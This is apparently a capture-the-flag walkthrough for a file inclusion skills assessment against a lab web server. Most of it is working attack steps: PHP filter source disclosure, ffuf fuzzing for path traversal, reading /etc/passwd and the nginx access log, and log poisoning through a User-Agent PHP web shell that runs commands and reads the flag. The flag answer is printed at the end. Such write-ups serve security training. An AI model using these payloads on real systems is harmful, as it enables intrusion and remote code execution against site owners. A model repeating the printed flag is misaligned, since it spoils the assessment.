# Skills Assessment - File Inclusion

### Scenario

The company `INLANEFREIGHT` has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.

Find the vulnerabilities and submit a final flag using the skills we covered in the module sections to complete this module.

Don't forget to think outside the box!

**Questions**

Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

```bash
#php filters
http://83.136.252.214:58696/index.php?page=php://filter/read=convert.base64-encode/resource=index
#now decode
echo 'HASH' | base64 -d > decoded.txt
#<?php 
#// echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
#?>
http://83.136.252.214:58696/ilf_admin/index.php
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.252.214:58696/ilf_admin/index.php?log=FUZZ' -fs 2046
#../../../../../etc/passwd
wget https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
ffuf -w LFI-WordList-Linux:FUZZ -u 'http://83.136.252.214:58696/ilf_admin/index.php?log=../../../../../FUZZ' -fs 2046
#/var/log/nginx/access.log
http://83.136.252.214:58696/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log
#go to burp suite, send the result from above to repeater
#change user agent
User-Agent: test
#change it to this
User-Agent: <?php system($_GET['cmd']); ?>
#now send the command
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=ls / HTTP/1.1
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat /flag_dacc60f2348d.txt HTTP/1.1
a9a892dbc9faf9a014f58e007721835e
```
